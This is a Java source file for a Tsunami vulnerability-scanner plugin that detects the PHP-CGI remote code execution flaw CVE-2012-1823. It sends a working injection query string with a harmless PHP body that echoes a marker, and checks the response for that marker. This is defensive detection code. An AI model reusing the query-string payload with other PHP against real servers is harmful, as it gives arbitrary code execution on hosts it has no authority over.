/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve20121823;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.UUID;
import javax.inject.Inject;

/** A Tsunami plugin for detecting CVE-2012-1823. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "PHP CVE-2012-1823 Detector",
    version = "0.1",
    description =
        "This plugin for Tsunami detects a remote code execution (RCE) vulnerability in PHP that"
            + " manifests when a query string is misinterpreted as command line parameters to the"
            + " CGI binary.",
    author = "Ryan Chan (rcc@google.com)",
    bootstrapModule = Cve20121823DetectorBootstrapModule.class)
public final class Cve20121823Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String QUERY_STRING =
      "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";

  static final String DETECTION_STRING = "CVE-2012-1823 DETECTOR RESULT: " + UUID.randomUUID();

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  Cve20121823Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve20121823Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    try {
      HttpResponse response =
          httpClient.send(
              post(NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + QUERY_STRING)
                  .withEmptyHeaders()
                  .setRequestBody(ByteString.copyFromUtf8("<? die('" + DETECTION_STRING + "') ?>"))
                  .build(),
              networkService);
      return DETECTION_STRING.equals(response.bodyString().map(String::trim).orElseGet(() -> ""));
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      // Avoid false positives.
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE_2012_1823"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2012-1823")
                .setDescription(
                    "sapi/cgi/cgi_main.c in PHP before 5.3.12 and 5.4.x before 5.4.2, when"
                        + " configured as a CGI script (aka php-cgi), does not properly handle"
                        + " query strings that lack an = (equals sign) character, which allows"
                        + " remote attackers to execute arbitrary code by placing command-line"
                        + " options in the query string, related to lack of skipping a certain"
                        + " php_getopt for the 'd' case."))
        .build();
  }
}
